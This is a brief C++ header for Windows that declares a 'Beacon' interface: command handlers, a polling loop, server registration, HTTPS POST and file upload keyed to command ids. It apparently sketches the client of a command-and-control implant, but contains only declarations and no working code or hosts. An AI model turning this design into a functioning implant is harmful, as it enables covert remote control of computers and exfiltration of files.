#pragma once
#include <windows.h>
#include <string>
#include <vector>
#include <functional>
#include <unordered_map>

// Forward declarations for module commands
namespace Beacon {
    struct Command {
        std::string id;
        std::string type;
        std::string params; // JSON string
    };
    
    using CommandHandler = std::function<void(const Command&)>;
    
    void RegisterHandler(const std::string& type, CommandHandler handler);
    void Loop();
    bool SendBeacon();
    bool UploadFile(const std::string& cmdId, const std::string& filename, const std::vector<BYTE>& data);
    bool RegisterWithServer();
    
    // Internal
    std::string BuildBeaconJSON();
    void ParseCommands(const std::string& response);
    bool HTTPSPost(const std::string& path, const std::string& body, std::string& response);
}